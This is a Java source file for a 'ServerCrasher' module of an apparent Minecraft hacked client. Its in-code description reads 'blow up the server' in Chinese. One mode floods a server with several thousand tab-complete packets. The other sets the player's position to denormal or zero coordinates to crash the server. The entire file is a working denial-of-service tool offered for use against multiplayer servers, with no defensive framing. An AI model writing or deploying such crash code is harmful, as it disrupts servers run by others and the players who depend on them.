package cn.snowflake.rose.mod.mods.WORLD;


import cn.snowflake.rose.Client;
import cn.snowflake.rose.events.impl.EventUpdate;
import cn.snowflake.rose.mod.Category;
import cn.snowflake.rose.mod.Module;
import cn.snowflake.rose.ui.notification.Notification;
import cn.snowflake.rose.utils.Value;
import com.darkmagician6.eventapi.EventTarget;
import net.minecraft.network.play.client.C14PacketTabComplete;

import java.util.Random;

public class ServerCrasher extends Module {
    public Value<String> mode = new Value<String>("ServerCrasher_Mode", "Mode",0);

    private boolean speedTick;
    private double yVal;
    double health;
    boolean hasDamaged = false;
    boolean hasJumped = false;
    double posY = 0.0D;

    public ServerCrasher() {
        super("ServerCrasher","Server Crasher", Category.WORLD);
        this.mode.addValue("C14TabComplete");
        this.mode.addValue("Position");
        setChinesename("\u70b8\u670d");
    }

    @Override
    public String getDescription() {
        return "炸服!";
    }

    boolean changeY = false;


    @EventTarget
    public void onUpdate(EventUpdate eventUpdate){

    }

    private int ticks = 0;

    public void onEnable() {
        if (mode.isCurrentMode("C14TabComplete")){
            int packets = 0;
            for (int i = 0; i < (1337 * 5); i++) {
                mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
                packets += 1;
            }
            Client.instance.getNotificationManager().addNotification(this,"Packet : " + packets, Notification.Type.INFO);
            set(false);
        }
        if (mode.isCurrentMode("Position")){
            int n = new Random().nextInt(11);
            ++this.ticks;
            if (n == 0) {
                mc.thePlayer.setPosition(1.856746317E-314, 1.856746317E-314, 1.856746317E-314);
            } else if (n == 1) {
                mc.thePlayer.setPosition(1.856746317E-314, 1.856746317E-314, 1.856746317E-314);
            } else if (n == 2) {
                mc.thePlayer.setPosition(1.856746317E-314, 1.856746317E-314, 1.856746317E-314);
            } else if (n == 3) {
                mc.thePlayer.setPosition(1.856746317E-314, 1.856746317E-314, 1.856746317E-314);
            } else if (n == 4) {
                mc.thePlayer.setPosition(0.0, 0.0, 0.0);
            } else if (n == 5) {
                mc.thePlayer.setPosition(0.0, 0.0, 0.0);
            } else if (n == 6) {
                mc.thePlayer.setPosition(0.0, 0.0, 0.0);
            } else if (n == 7) {
                mc.thePlayer.setPosition(0.0, 0.0, 0.0);
            } else if (n == 8) {
                mc.thePlayer.setPosition(0.0, 0.0, 0.0);
            } else if (n == 9) {
                mc.thePlayer.setPosition(0.0, 0.0, 0.0);
            } else if (n == 10) {
                mc.thePlayer.setPosition(0.0, 0.0, 0.0);
            } else if (n == 11) {
                    mc.thePlayer.setPosition(0.0, 0.0, 0.0);
            }
        }
    }

    public void onDisable() {
    }


}

